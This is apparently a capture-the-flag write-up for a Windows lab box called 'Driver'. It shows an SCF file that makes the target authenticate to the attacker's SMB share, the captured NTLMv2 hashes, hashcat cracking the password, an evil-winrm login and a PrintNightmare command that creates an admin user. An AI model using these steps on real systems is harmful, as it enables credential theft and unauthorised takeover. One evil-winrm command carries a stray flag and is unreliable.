# Driver

Difficulty: 7
Key takeway: SMB relay attack
Tags: Relay, SCF File upload, SMB
Type: Windows

# Enumeration

portscan 

```bash

```

# Initial Access

found hashes using scf file upload and relay attack 

1. create a .scf file with 

```bash
[Shell]

Command=2

IconFile=\\10.10.17.187\share\test.txt

[Taskbar]

Command=ToggleDesktop
```

1. 

```bash
[SMB] NTLMv2 Client   : 10.129.236.166
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:42850cba908cae78:6D8E15396C1693C91989534162343F1B:010100000000000000E28ED41ABBD7013EE424C415A0A06000000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.236.166
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:7b0e8bef7dc2f5f8:DC707B6A3EE61B41CDD828BF5329DD6F:0101000000000000F8D853D61ABBD70123FDDEC1AFADF8BC00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.236.166
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:624f22971aba4940:1AA9830B9E0ED33D447D050141E50068:0101000000000000ABAC6FD71ABBD7017129ACE8B04B3ABA00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.236.166
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:a5a446f245ac2bb3:71C80D26E3809A3BDB5F55928660079D:0101000000000000A79267D81ABBD7016DEF7EF0D76F1F0000000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.236.166
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:c56db9b268abe4d5:A8FB939A8B67E0677C2F0E443C057CBB:01010000000000003C8534D91ABBD70187DC8E610A22818700000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.236.166
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:49ca03726ff02503:9670B1AAC1F86AF76D8821EB26E91EA2:0101000000000000BF441EDA1ABBD7011EC3E92890FBAE0300000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.129.236.166
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:ebb8cb6c0fa01f20:7CD27AD71AB8244DD21857DAC61865A7:01010000000000008B8EF9DA1ABBD701A3D5B6DF306EAFEA00000000020000000000000000000000
```

cracked the hash 

```bash
TONY::DRIVER:42850cba908cae78:6d8e15396c1693c91989534162343f1b:010100000000000000e28ed41abbd7013ee424c415a0a06000000000020000000000000000000000:liltony
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TONY::DRIVER:42850cba908cae78:6d8e15396c1693c919895...000000
Time.Started.....: Wed Oct  6 14:37:51 2021 (2 secs)
Time.Estimated...: Wed Oct  6 14:37:53 2021 (0 secs)
Guess.Base.......: File (/home/kali/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    33211 H/s (6.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 32768/14344385 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 30720/14344385 (0.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: !!!!!! -> eatme1
```

- As port 5985 is open I tried using `evil-winrm` to gain a shell with the creds I just obtained

```bash
evil-winrm -i <target-ip> -u tony -p liltony 
```

# Privilege Escalation

Winpeas results showed that spoolsv service is running 

which allows us to create a new user with escalated privileges

used `Nightmare` to create a new user and logged in as the new user using evil-winrm 

```bash
Invoke-Nightmare -NewUser "escalated" -NewPassword "newpassword"

# bash 
evil-winrm -i <target-ip> -DriverName "RICOH_PCL6" -u escalated -p newpassword
```

## Notes

-